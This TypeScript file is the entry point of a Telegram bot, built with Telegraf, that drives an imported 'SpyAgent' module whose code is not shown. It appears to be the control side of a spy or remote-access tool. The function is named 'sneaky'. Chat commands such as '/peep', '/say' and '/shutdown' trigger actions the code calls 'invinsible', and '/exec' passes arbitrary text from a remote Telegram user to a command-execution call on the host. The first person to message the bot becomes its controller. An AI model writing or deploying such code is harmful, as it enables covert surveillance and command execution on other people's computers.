import { Telegraf } from 'telegraf';
import os from 'os';
import SpyAgent from './spyAgent';
import { Action, UserData } from './types';

const eventsToHandle = ['SIGTERM', 'SIGINT', 'unhandledRejection', 'uncaughtException', 'SIGUSR2'];

async function sneaky() {
    const bot = new Telegraf(process.env.BOT_TOKEN!);

    const agent = new SpyAgent(bot);

    bot.start((ctx) => {
        ctx.reply('Welcome sir,Wanna say Hello 😃?');
    });

    bot.command('peep', (ctx) => {
        const { message: { text } } = ctx.update;
        const parts = text.split('+');
        const action: Action = {
            command: parts[0].trim(),
            text: parts[1]
        };
        agent.invinsible(action);
    });

    bot.command('say', (ctx) => {
        const { message: { text } } = ctx.update;
        const parts = text.split('+');
        const action: Action = {
            command: parts[0].trim(),
            text: parts[1]
        };
        agent.invinsible(action);
    });

    bot.command('shutdown', (ctx) => {
        const { message: { text } } = ctx.update;
        const action: Action = {
            command: text.trim()
        };
        agent.invinsible(action);
    });

    bot.command('register', async (ctx) => {
        try {
            const { message: { text } } = ctx.update;
            const parts = text?.split('+')[1]?.trim()?.split(',');
            const data: UserData = {
                name: parts[0],
                department: parts[1],
                title: parts[2],
                userId: ctx.from.id.toString(),
            };
            await agent.registerUser(data, ctx);
        }
        catch (err) {
            console.log(err);
        }
    });

    bot.command('whoami', (ctx) => {
        try {
            const user = agent.getUser();
            const quote = `Name:   ${user.name}\nDepartment:   ${user.department}\nTitle:   ${user.title}\n`;
            ctx.replyWithMarkdownV2(quote);
        }
        catch (err) {
            console.log(err);
        }
    });

    bot.command('exec', (ctx) => {
        const { message: { text } } = ctx.update;
        const parts = text.split('/exec :')[1];
        agent.execCommand(parts);
    });

    bot.on('message', (ctx) => {
        if (agent.isAnonymous()) ctx.reply('agent007 at your service sir.')
        if (agent.isAnonymous()) agent.setUser = ctx.from.id.toString();
    });

    bot.launch();
    if (!agent.isAnonymous()) agent.whichUser(os.userInfo().username);

    eventsToHandle.forEach((e) => process.on(e, (err) => {
        agent.die();
        console.log(err);
        return process.exit();
    }));


};

sneaky();